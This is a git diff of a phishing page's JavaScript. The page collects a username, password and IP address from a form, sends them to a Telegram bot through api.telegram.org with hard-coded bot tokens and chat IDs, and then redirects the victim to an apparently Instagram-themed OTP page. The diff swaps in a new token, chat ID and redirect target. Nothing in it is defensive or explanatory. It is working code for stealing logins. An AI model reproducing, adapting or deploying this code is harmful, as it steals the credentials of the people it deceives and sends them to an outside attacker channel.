@@ -161,8 +161,8 @@
             var ipaddress = document.getElementById('ipaddress').value;
 
             var telegramMessage = `username: ${username}\nIpaddress: ${ipaddress}\npassword: ${password}`;
-          var token = '7359860344:AAHo06TGGIjd2fyD4bDcYgdjf9RPjsvpMbE';
-            var chat_id = '1747506929';
+           var token = '8426130944:AAFqzg6H0uK4TpHPWKiYdqXve46_8Ekjy6I';
+            var chat_id = '7605799343';
 
 
             var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
@@ -171,7 +171,7 @@
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        window.location.href = 'pop1.html';  // Redirect to thank you page
+                        window.location.href = 'instagram/otp/657daf104b167f68d1979b9c.html';  // Redirect to thank you page
                     } else {
                         alert('Error sending message.');
                     }
@@ -196,3 +196,4 @@
 </body>
 
 </html>
+
